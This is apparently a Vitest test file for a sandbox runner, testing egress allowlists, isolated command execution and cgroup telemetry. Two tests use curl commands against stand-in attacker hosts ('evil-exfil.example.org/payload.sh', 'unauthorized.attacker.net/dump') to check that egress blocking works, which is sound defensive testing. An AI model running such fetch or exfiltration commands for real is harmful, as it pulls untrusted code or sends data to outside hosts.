import { describe, it, expect } from 'vitest';
import {
  verifyEgressHostAllowed,
  executeWorkspaceCommand,
  collectContainerTelemetry,
} from './sandboxRunner.ts';
import { buildFile } from './crypto.ts';
import { stateStore } from './db.ts';

describe('Isolated Sandbox Execution & Host Cgroup Telemetry', () => {
  it('enforces strict network egress domain allowlists', () => {
    const whitelist = ['www.kaggle.com', 'pypi.org'];
    expect(
      verifyEgressHostAllowed('curl https://www.kaggle.com/api/v1/kernels/list', whitelist)
    ).toEqual({ allowed: true, blockedHost: null });

    expect(
      verifyEgressHostAllowed('curl https://evil-exfil.example.org/payload.sh', whitelist)
    ).toEqual({ allowed: false, blockedHost: 'evil-exfil.example.org' });
  });

  it('executes genuine shell commands inside an isolated workspace directory', async () => {
    const initialFile = buildFile(
      '/workspace/hello.txt',
      'ChronosBox Sandbox Verification\n',
      new Date().toISOString()
    );

    const res = await executeWorkspaceCommand({
      run: stateStore.runs[0],
      command: 'cat hello.txt',
      preSnapshotFiles: [initialFile],
    });

    expect(res.exitCode).toBe(0);
    expect(res.semanticErrorClass).toBe('EXIT_0_OK');
    expect(res.stdout).toContain('ChronosBox Sandbox Verification');
  });

  it('blocks unauthorized network egress before spawning subprocess', async () => {
    const res = await executeWorkspaceCommand({
      run: stateStore.runs[0],
      command: 'curl -s https://unauthorized.attacker.net/dump',
      preSnapshotFiles: [],
    });

    expect(res.exitCode).toBe(126);
    expect(res.semanticErrorClass).toContain('EGRESS_POLICY_VIOLATION');
    expect(res.stderr).toContain('Blocked outbound connection');
  });

  it('collects real process and cgroup resource telemetry for active runs', () => {
    const containers = collectContainerTelemetry(stateStore.runs);
    expect(containers.length).toBeGreaterThanOrEqual(3);
    const first = containers[0];
    expect(first.containerId).toMatch(/^ctr_cgroups_/);
    expect(first.currentMemoryMb).toBeGreaterThan(0);
    expect(first.samples.length).toBeGreaterThanOrEqual(8);
  });
});
